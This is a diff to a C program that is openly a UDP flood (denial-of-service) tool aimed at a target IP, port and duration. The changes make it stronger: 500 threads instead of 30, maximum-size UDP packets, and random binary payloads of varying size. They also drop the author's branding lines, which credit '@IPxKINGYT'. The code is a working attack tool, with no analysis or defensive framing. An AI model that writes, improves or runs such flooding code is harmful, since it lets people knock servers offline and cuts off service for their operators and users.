@@ -6,8 +6,8 @@
 #include <arpa/inet.h>
 #include <time.h>
 
-#define MAX_THREADS 30
-#define PAYLOAD_SIZE 1024  // Payload size in bytes
+#define MAX_THREADS 500          // Increased number of threads
+#define PAYLOAD_SIZE 65507       // Maximum UDP payload size
 
 typedef struct {
     char ip[16];
@@ -15,15 +15,17 @@ typedef struct {
     int duration;
 } AttackParams;
 
+void generate_binary_payload(char* payload, size_t size) {
+    for (size_t i = 0; i < size; i++) {
+        payload[i] = (char)(rand() % 256); // Random byte values
+    }
+}
+
 void* send_payload(void* arg) {
     AttackParams* params = (AttackParams*)arg;
     int sock;
     struct sockaddr_in server_addr;
     char payload[PAYLOAD_SIZE];
-
-    // Create a large payload to simulate high ping
-    memset(payload, 'A', PAYLOAD_SIZE - 1);
-    payload[PAYLOAD_SIZE - 1] = '\0';
 
     sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
     if (sock < 0) {
@@ -37,7 +39,10 @@ void* send_payload(void* arg) {
 
     time_t start_time = time(NULL);
     while (time(NULL) - start_time < params->duration) {
-        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        size_t dynamic_size = (rand() % (PAYLOAD_SIZE - 64)) + 64; // Variable size
+        generate_binary_payload(payload, dynamic_size);
+
+        if (sendto(sock, payload, dynamic_size, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
             perror("Send failed");
             break;
         }
@@ -60,7 +65,7 @@ int main(int argc, char* argv[]) {
 
     pthread_t threads[MAX_THREADS];
 
-    printf("MADE BY @IPxKINGYT %s:%d for %d seconds with %d threads...\n",
+    printf("Attack started on %s:%d for %d seconds with %d threads...\n",
            params.ip, params.port, params.duration, MAX_THREADS);
 
     for (int i = 0; i < MAX_THREADS; i++) {
@@ -73,8 +78,7 @@ int main(int argc, char* argv[]) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("FUCKED ATTACK @IPxKINGYT HOST IP %s on port %d for %d seconds\n",
-           params.ip, params.port, params.duration);
+    printf("Attack finished.\n");
 
     return 0;
 }
